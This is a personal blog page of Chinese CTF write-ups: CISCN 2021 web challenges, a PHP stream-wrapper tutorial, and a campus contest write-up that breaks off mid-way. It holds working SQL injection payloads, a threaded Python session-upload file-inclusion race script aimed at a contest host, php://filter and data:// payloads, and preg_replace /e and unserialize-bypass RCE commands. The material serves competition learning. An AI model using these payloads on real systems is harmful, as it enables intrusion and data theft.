<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="YTsang"><meta name="copyright" content="YTsang"><title>Y. blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Y. blog" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://note.youdao.com/yws/api/personal/file/WEB4d4bfca5baf6c87d4aa15350aa33e8a7?method=download&amp;shareKey=fec53138a84367efadb03ddfa08bcb24"></div><div class="author-info__name text-center">YTsang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">20</span></a></div></div></div><nav id="nav" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Y. blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Y. blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/17/%E5%9B%BD%E8%B5%9Bwriteup/">国赛线上初赛writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-17</time><div class="content"><p>菜鸡划水，记录一下部分题目，其余的慢慢补充</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><ul>
<li><p>试了一下报错注入，过滤information和其他表，有flag表，无列名注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39;) or (updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id))c),0x7e),1)) #&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>
</li>
<li><p>注出字段id和no，注出flag表名20a14115-37f4-4396-aaac-c62aefe1cfb8</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;123&#39;) or (updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e),1)) #&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB79b574a38e4825bf3c02260811474749?method=download&shareKey=21ad6ca8951c8979e303a24b5b4675a3"></p>
</li>
<li><p>读flag  CISCN{IIm0Q-dxnht-HYxAk-x4NZU-xdiGF-}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;123&#39;) or (updatexml(1,concat(0x7e,mid((select group_concat(&#96;20a14115-37f4-</span><br><span class="line">4396-aaac-c62aefe1cfb8&#96;) from flag),25,16),0x7e),1)) #&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB0c868cd71c40d26f28521cb7d4538777?method=download&shareKey=9da7dd112430f6ed7a39d7da2369a20c"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB57a9c9b8eb94d8f510c154f84a613187?method=download&shareKey=7686b585f92f8fee60fe19218af677f7"></p>
</li>
</ul>
<h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><ul>
<li><p>备份文件.index.php.swo，得到源码。  </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBaf78f9fcce3541a7c4cf3e5ecf9d7df1?method=download&shareKey=0d4905b43fd1884c82ef657868fb092d"></p>
</li>
<li><p>题目提醒flag在看不见的地方，猜测在注释，考虑用php内置类来读类中函数的注释，通过<code>getDocComment()</code>方法获取注释，本地测试可行。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB34443f0748607776eb3c8353b948fa9e?method=download&shareKey=7286e6c622dcf8d5fc361a01aba67f11"></p>
</li>
<li><p>用burpsuite爆破，flag在函数q的注释里 </p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB12afe88996aa909a8c5ce4588125ff7f?method=download&shareKey=7eb0d30d5f34d2b45a22e583473bf1f1"></p>
</li>
</ul>
<h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><ul>
<li><p>扫目录，扫出.listing，提示you_can_seeeeeeee_me.php,打开是phpinfo，session有可以利用的点。  </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB96fe2720637dc08c1c78501d5289b923?method=download&shareKey=aff2ecf5dcd0b91ccb05302e55934be8"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf0a8cd7ec96045bafc50cafff4b9847b?method=download&shareKey=8321c53e740f2b9a82d41e01e4d1539e"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBaade31e0e6260dd57542d68ed2834365?method=download&shareKey=2bdc7d2391f1a145a9be90d015be5ce2"></p>
</li>
<li><p>利用session.upload_progress进行文件包含，网上找脚本改了直接用，提示flag在<code>/etc</code>里，遍历发现疑似文件，五层套娃后有个fl444444g文件。  </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6fc821eb55319c69c9ea4b8a4ed7902a?method=download&shareKey=f11fcd3febd5926952e2f08b7afa1b33"></p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1f362c387f2df8442d281cdb89ad5d4d?method=download&shareKey=e6a31d097fdfdd469492d5b09b10a001"></p>
</li>
<li><p>直接读fl444444g文件，拿到flag。  </p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEB466ec70dc473a62890dd006816ce961c?method=download&shareKey=2221ce4b1bb63fcb4ab4798fb8d92f3d"></p>
</li>
<li><p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">  resp = session.post(<span class="string">&#x27;http://124.71.239.218:24412/&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/eieeghdcda/adbababjaa/dcbbhjidfa/dbjbeiffaj/abhecdbhbc/fl444444g&quot;));?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;ctf.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  data=&#123;</span><br><span class="line">  <span class="string">&#x27;filed&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;cf&#x27;</span>:<span class="string">&#x27;../../../../../../var/lib/php/sessions/hdahbcchac/sess_&#x27;</span>+sessid</span><br><span class="line">  &#125;</span><br><span class="line">  resp = session.post(<span class="string">&#x27;http://124.71.239.218:24412/index.php&#x27;</span>,data=data)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&#x27;ctf.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">   print(resp.text)</span><br><span class="line">   event.clear()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> event=threading.Event()</span><br><span class="line"> <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">   threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">   threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"> event.set()</span><br></pre></td></tr></table></figure>

</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">PHP伪协议在ctf中的应用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-08</time><div class="content"><p>经常遇到php伪协议，总结一下。</p>
<p>php中支持的伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h1><p>**file://**：用于访问本地文件。常与curl函数结合一起</p>
<p>allow_url_fopen:默认值是ON，允许url里的封装协议访问文件</p>
<p>allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件</p>
<p>file://协议不受影响，当这两个参数都是off时，file://协议也能使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; 协议必须是绝对路径和文件名</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd2b530f1426daa10b865c58b8b144e54?method=download&shareKey=e58da1bcfb5a8484e190044e48d506a9"></p>
<h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p>**php://**：用于访问各个输入输出流。有<code>php://filter</code>、<code>php://input</code>。</p>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>这是较为经常使用的伪协议，用于任意文件读取，通常用于读flag文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;[read&#x2F;write]&#x3D;string.[rot13&#x2F;strip_tags&#x2F;…..]&#x2F;resource&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>php://filter参数：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">resource=&lt;要过滤的数据流&gt;</td>
<td align="center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="center">read=&lt;读链的筛选列表&gt;</td>
<td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
</tr>
<tr>
<td align="center">write=&lt;写链的筛选列表&gt;</td>
<td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
</tr>
<tr>
<td align="center">&lt;；两个链的筛选列表&gt;</td>
<td align="center">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>payload读取源代码并base64输出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>

<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong>php://input</strong></h2><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。使用需要开启allow_url_include 。</p>
<p>当<code>enctype=&quot;multipart/form-data&quot;</code>时，<code>php://input</code>是无效的。 </p>
<h1 id="phar-协议"><a href="#phar-协议" class="headerlink" title="**phar://**协议"></a>**phar://**协议</h1><p> **phar://**：PHP 归档，在ctf常常跟文件包含，文件上传结合着考察。 通俗点说就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;test.[zip&#x2F;jpg&#x2F;png…]&#x2F;file.txt</span><br></pre></td></tr></table></figure>

<h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h1><p>**data://**：需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用。 通常可以用来执行PHP代码。 </p>
<p>很常用的数据流构造器，将读取后面base64编码字符串后解码的数据作为数据流的输入 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,base编码字符串</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>

<h1 id="zlib-协议"><a href="#zlib-协议" class="headerlink" title="zlib://协议"></a>zlib://协议</h1><p>以下三种在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用 </p>
<h2 id="zip-："><a href="#zip-：" class="headerlink" title="**zip://**："></a>**zip://**：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure>

<h2 id="bzip2-："><a href="#bzip2-：" class="headerlink" title="**bzip2://**："></a>**bzip2://**：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file&#x3D;compress.bzip2:&#x2F;&#x2F;nac.bz2</span><br></pre></td></tr></table></figure>

<h2 id="zlib-："><a href="#zlib-：" class="headerlink" title="**zlib://**："></a>**zlib://**：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file&#x3D;compress.zlib:&#x2F;&#x2F;file.gz</span><br></pre></td></tr></table></figure>

<h1 id="靶机分析"><a href="#靶机分析" class="headerlink" title="靶机分析"></a>靶机分析</h1><h2 id="ACTF2020-新生赛-Include1"><a href="#ACTF2020-新生赛-Include1" class="headerlink" title="[ACTF2020 新生赛]Include1"></a>[ACTF2020 新生赛]Include1</h2><ul>
<li><p>题目提示文件包含，猜测用伪协议读取，用php://filter读</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9b0be7cafb070178f7ea83afd368dbf8?method=download&shareKey=51123d2718705c4cd8437f7bc22fa07d"></p>
</li>
<li><p>读取出一串base64编码，解码后就有flag。</p>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBd80b2d3e521ccd9377ed9f4310fc6003?method=download&shareKey=1cd6ac9769f6271bccf4e37f590ebe98"></p>
</li>
</ul>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><ul>
<li><p>直接给出源码,<code>file_get_contents</code>需全等于<code>ohhhhhhhhhhhhh</code>同时读ohhh.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;contents&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;ohhhhhhhhhhhhh&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h4&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h4&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        die(&quot;NONONONO&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  &#x2F;&#x2F;ohhh.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>用data://和php://伪协议读ohhh.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contents&#x3D;data:text&#x2F;plain;base64,b2hoaGhoaGhoaGhoaGg&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ohhh.php</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf6c0a88ee51e9180956d2f651e391f71?method=download&shareKey=3276110a6f0fa571cc0a69c449bc42f4"></p>
</li>
<li><p>base64解码后即为ohhh.php源码，利用preg_replace /e漏洞进行代码执行，读flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;var&#x2F;tmp&#x2F;flag%27);</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB46823b2daf9f0cb7287796f11226cc44?method=download&shareKey=dbd804e7c99bed316d1b6ff192211a39"></p>
</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AFwriteup/">第四届海啸杯writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-08</time><div class="content"><p>一次校内比赛。鸽了好久的wp，比赛的时候有事在外面，所以只做了提前放出来的题 ，复现学习下。</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><ul>
<li><p>题目直接给出源码，考点应该是反序列化和无参数RCE。先看第一部分，有个<code>str_shuffle()</code>函数，查一下发现是用来随机打乱的，也就是说<code>username</code>，<code>password</code>两个参数都是md5编码后随机打乱的，而后面两个参数要和反序列化后的数组比较并且要求相等，最后无参数RCE。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username = str_shuffle(md5(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">$password = str_shuffle(md5(<span class="string">&quot;root&quot;</span>));</span><br><span class="line"></span><br><span class="line">$login = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;str&#x27;</span>])) &#123;</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    $unserialize_str = unserialize($str);</span><br><span class="line">    <span class="keyword">if</span> ($unserialize_str[<span class="string">&#x27;username&#x27;</span>] == $username &amp;&amp; $unserialize_str[<span class="string">&#x27;password&#x27;</span>] == $password) &#123;</span><br><span class="line">        $login = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($login &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;含有危险函数&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不符合正则表达式&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>注意到这里的比较是属于弱比较，之前有学过弱类型比较的问题，知道<strong>bool类型的true跟任意字符串可以弱类型相等</strong>，也就是说这里只要让数组的值为bool类型的true，然后进行反序列化就能绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">true</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">$o = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $o;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB181ea2250cdd96881869c89c128b4a7d?method=download&shareKey=42c88190efaa5d44828e977dabc6ad83"></p>
</li>
<li><p>传参发现已经成功绕过，接着构造无参数RCE就行了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;cat%20&#x2F;flag;</span><br></pre></td></tr></table></figure>

<p><img src="https://note.youdao.com/yws/api/personal/file/WEB37a85f536ce8a89cf670fc3100fcb73c?method=download&shareKey=8f42e2d8d9ea15915d0fddafeed87ff0"></p>
</li>
<li><p>之前也有学过这类题，先把一些常用的函数拿出来，看一下哪些被ban了，找一下能用的函数。</p>
